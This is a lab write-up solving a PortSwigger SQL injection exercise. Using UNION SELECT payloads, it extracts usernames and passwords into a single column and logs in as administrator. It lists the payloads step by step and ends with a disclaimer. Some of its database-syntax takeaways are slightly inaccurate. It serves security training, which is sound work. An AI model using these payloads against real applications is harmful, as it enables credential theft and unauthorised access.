# Lab 06: SQL Injection UNION Attack — Retrieving Multiple Values in a Single Column

> **Source:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)  
> **Track:** SQL Injection  
> **Difficulty:** Practitioner  
> **Status:** ✅ Solved

---

## 🎯 Objective

Exploit a SQL injection vulnerability in the product category filter to retrieve all usernames and passwords from the `users` table, then log in as the `administrator` user.

> **Constraint:** The original query returns **2 columns**, but only **one column accepts text data**. Therefore, both `username` and `password` must be concatenated into a single column.

---

## 🛠️ Tools

- Burp Suite Community Edition
- Firefox
- Kali Linux

---

## 🔍 Step-by-Step Methodology

### Step 1 — Confirm SQL Injection Point

Sending a single quote after the category parameter triggered an internal server error.

```sql
/filter?category=Pets'
```

**Result:** `HTTP/2 500 Internal Server Error` → SQL injection confirmed.

<img width="1280" height="684" alt="Screenshot 2026-09-03 223640" src="https://github.com/user-attachments/assets/6c2fd8a0-697d-4cd4-875a-a5d06d21dc0a" />


---

### Step 2 — Determine Number of Columns

Used `UNION SELECT` with `NULL` values to match the column count.

```sql
' UNION SELECT NULL, NULL--
```

**Result:** `HTTP/2 200 OK` → Original query has **2 columns**.

<img width="1280" height="684" alt="Screenshot 2026-09-03 224730" src="https://github.com/user-attachments/assets/8285cd97-bd2a-4412-b637-c328fb42631f" />


---

### Step 3 — Identify Which Column Accepts Text

Tested each column individually by replacing `NULL` with a string literal.

**Test Column 1:**
```sql
' UNION SELECT 'abc', NULL--
```

**Result:** `HTTP/2 500 Internal Server Error` → Column 1 does **not** accept text.

<img width="1280" height="684" alt="Screenshot 2026-09-03 224943" src="https://github.com/user-attachments/assets/9c456de1-d20f-43fd-956c-fc93a29463bc" />


**Test Column 2:**
```sql
' UNION SELECT NULL, 'abc'--
```

**Result:** `HTTP/2 200 OK` → **Column 2 accepts text**.

<img width="1280" height="684" alt="Screenshot 2026-09-03 225259" src="https://github.com/user-attachments/assets/e73ee57a-727f-4431-86ea-19c3d2a633d1" />


---

### Step 4 — Extract Credentials via Concatenation

Since only one column is text-compatible, concatenated `username` and `password` using the `||` operator (Oracle syntax) with a tilde `~` separator.

```sql
' UNION SELECT NULL, username||'~'||password FROM users--
```

**Result:** All credentials returned in the second column.

**Credentials Retrieved:**

| User | Concatenated Output |
|------|---------------------|
| administrator | `administrator~44kn6hy8jl6ok7j3ze0h` |

<img width="1280" height="684" alt="Screenshot 2026-09-03 225804" src="https://github.com/user-attachments/assets/cd1324ca-e2ce-4eb0-a75f-742d5d98c44c" />

<img width="1280" height="684" alt="Screenshot 2026-09-03 225842" src="https://github.com/user-attachments/assets/3976d0a2-7313-464a-a4be-1ee7c2bcc811" />

---

### Step 5 — Login as Administrator

Parsed the concatenated output to obtain the password:
- **Username:** `administrator`
- **Password:** `44kn6hy8jl6ok7j3ze0h`

Logged in successfully. Lab marked as solved.

<img width="1280" height="684" alt="Screenshot 2026-09-03 230312" src="https://github.com/user-attachments/assets/7c0c71a2-0a21-4503-8a9b-e4810b4e5d3a" />
<img width="1280" height="684" alt="Screenshot 2026-09-03 230328" src="https://github.com/user-attachments/assets/ae320d81-0d3e-482a-985e-25e621173ffa" />

---

## 📝 Payloads Summary

| Step | Payload | Purpose |
|------|---------|---------|
| 1 | `Pets'` | Confirm injection point |
| 2 | `' UNION SELECT NULL, NULL--` | Determine column count (2 columns) |
| 3a | `' UNION SELECT 'abc', NULL--` | Test column 1 for text compatibility |
| 3b | `' UNION SELECT NULL, 'abc'--` | Test column 2 for text compatibility |
| 4 | `' UNION SELECT NULL, username&#124;&#124;'~'&#124;&#124;password FROM users--` | Extract both fields in one column |

---

## 🎯 Key Takeaways

1. **Not all columns accept text** — Always test each column individually with string literals.
2. **Use concatenation when limited** — When only one text column is available, use `||` (Oracle) or `CONCAT()` (MySQL/PostgreSQL) to combine multiple fields.
3. **Choose a unique separator** — Using `~` or `:` makes it easy to split username and password later.
4. **Database-specific syntax matters** — `||` is Oracle concatenation; MySQL uses `CONCAT()`.

---

## ⚠️ Disclaimer

This repository is for **educational purposes only**. The techniques demonstrated here should only be practiced in authorized environments such as the PortSwigger Web Security Academy. Unauthorized SQL injection testing on systems you do not own or have explicit permission to test is illegal and unethical.

---

## 🔗 References

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [Retrieving Multiple Values in a Single Column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)

---
📝 Author: Saber Hasan Swoyon
📅 Date Solved: 2026-09-03

*Happy Hacking! 🐱‍💻*
